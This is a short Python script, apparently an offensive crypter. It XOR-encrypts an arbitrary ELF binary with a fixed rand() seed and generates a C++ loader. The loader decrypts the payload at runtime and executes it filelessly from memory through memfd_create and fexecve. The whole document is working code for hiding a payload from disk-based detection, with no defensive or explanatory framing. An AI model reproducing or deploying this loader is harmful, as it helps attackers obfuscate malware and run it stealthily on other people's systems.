import ctypes
import sys

libc = ctypes.CDLL("libc.so.6")

def encrypt_shellcode(binary_path, output_path, seed=0x32):
    with open(binary_path, "rb") as f:
        shellcode = f.read()

    libc.srand(seed)
    encrypted = []
    for byte in shellcode:
        encrypted.append(byte ^ (libc.rand() % 256))

    hex_lines = []
    for i in range(0, len(encrypted), 12):
        chunk = encrypted[i:i+12]
        hex_lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk))

    hex_str = ",\n".join(hex_lines)

    loader = f"""#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/memfd.h>

unsigned char encrypted_shellcode[] = {{
{hex_str}
}};

int main(int argc, char **argv, char **envp) {{
    unsigned char elf[sizeof(encrypted_shellcode)];
    srand(0x32);
    for (size_t i = 0; i < sizeof(encrypted_shellcode); i++)
        elf[i] = encrypted_shellcode[i] ^ (rand() % 256);

    int fd = syscall(SYS_memfd_create, "x", MFD_CLOEXEC);
    if (fd < 0) {{
        perror("memfd_create");
        return 1;
    }}

    write(fd, elf, sizeof(elf));

    char *new_argv[] = {{argv[0], NULL}};
    fexecve(fd, new_argv, envp);

    perror("fexecve");
    return 1;
}}
"""

    with open(output_path, "w") as f:
        f.write(loader)

    print(f"ELF size: {len(shellcode)} bytes")
    print(f"Loader written to: {output_path}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: python3 {{sys.argv[0]}} <binary> <output.cpp>")
        sys.exit(1)
    encrypt_shellcode(sys.argv[1], sys.argv[2])